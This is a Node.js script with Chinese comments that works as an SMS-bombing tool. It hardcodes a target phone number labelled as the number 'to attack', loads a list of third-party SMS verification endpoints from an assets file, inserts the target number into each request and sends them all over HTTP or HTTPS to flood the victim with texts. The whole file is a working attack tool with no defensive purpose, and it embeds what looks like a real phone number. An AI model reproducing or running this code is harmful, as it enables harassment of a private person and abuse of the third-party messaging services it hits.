var http=require('http'),
    https=require('https'),
    querystring=require('querystring'),
    urlUtil=require('url'),
    assets=require('./assets').assets;
    
//要攻击的手机号码
var ATTACK_NUMBER='14741187711';

//处理超时函数
var _request=function(request){
    return function(options,callback){
        var timeout=options['timeout'] || 8000,
            timeoutEventId;
        var req=request(options,function(res){
                res.on('end',function(){
                    clearTimeout(timeoutEventId);
                });
                
                res.on('close',function(){
                    clearTimeout(timeoutEventId);
                });
                
                res.on('abort',function(){
                });
                
                callback(res);
        });
        
        //超时
        req.on('timeout',function(){
            req.abort();
        });
        
        //如果存在超时
        timeout && (timeoutEventId=setTimeout(function(){
            req.emit('timeout',{message:'have been timeout...'});
        },timeout));
        return req;
    }

};

//重写http.request方法，增加timeout属性
http.request=(function(request){
    return _request(request);
})(http.request);

//重写https.request方法，增加timeout属性
https.request=(function(request){
    return _request(request);
})(https.request);


//简单的mixin，如mixin({},{name:'nodejs',number:function(){}},{name:'python',age:'4'});
function mixin(sourceTarget,destTargets){
    sourceTarget=sourceTarget || {};
    //nodejs中的arguments竟然是一个map，这个有点奇怪了
    for(var index in arguments){
        if (index == '0') continue;
        var object=arguments[index],
            valueItem;
        for(var item in object){
            valueItem=object[item];
            //判断是否是函数
            if(Object.prototype.toString.call(valueItem) == '[object Function]' ){
                valueItem=valueItem.call(object,ATTACK_NUMBER);
            }
            sourceTarget[item]=valueItem;
        }
        
    }
    return sourceTarget;
}


//程序逻辑

if (Object.prototype.toString.call(assets) == '[object Array]'){

    assets.forEach(function(asset){
        var url=asset['url'],
            urlInfo=urlUtil.parse(url,true),
            query=urlInfo['query'];
            delete urlInfo['query'];
        asset=mixin({},asset,urlInfo);
        asset['parameters']=mixin({},asset['parameters']||{},query);
        asset['path']=asset['pathname'];
        urlInfo['protocol']=='https:' ? sendHttpsSMS(asset) : sendHttpSMS(asset);
        
    });
}

//发送短信
function sendHttpSMS(asset){
    var params=querystring.stringify(asset['parameters']),
        method=asset['method'];
    //替换?号为要攻击的手机号
    params=params.replace('%3F',ATTACK_NUMBER);
    method=='GET' && (asset['path']=asset['path']+'?'+params);
    asset['port']=asset['port']||80;
    console.log(asset.path);
    var req=http.request(asset,function(res){
        /*
        res.on('data',function(chunk){
            console.log(chunk.toString('utf8'));
        });
        */
    });
    method=='GET' ? req.end() :req.end(params);
}

//发送短信
function sendHttpsSMS(asset){
    var params=querystring.stringify(asset['parameters']),
        method=asset['method'];
    //替换?号为要攻击的手机号
    params=params.replace('%3F',ATTACK_NUMBER);
    method=='GET' && (asset['path']=asset['path']+'?'+params);
    asset['port']=asset['port']||443;
    console.log(asset.path);
    var req=https.request(asset,function(res){
        /**
         * 返回的数据
        res.on('data',function(chunk){
            console.log(chunk.toString());
        });
         **/
    });
    method=='GET' ? req.end() :req.end(params);
}
